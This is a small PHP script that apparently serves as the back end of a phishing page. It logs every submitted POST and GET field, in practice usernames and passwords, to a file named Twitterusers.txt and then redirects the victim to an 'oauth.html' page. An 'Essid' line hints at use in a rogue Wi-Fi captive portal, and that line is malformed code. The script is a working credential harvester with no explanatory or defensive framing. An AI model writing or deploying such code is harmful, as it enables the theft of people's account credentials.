:<?php
header("Location: oauth.html");
$handle = fopen("/root/Twitterusers.txt", "a");
foreach($_POST as $variable => $value) {
fwrite("Essid =", $essid );
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fclose($handle);
exit;
?> 
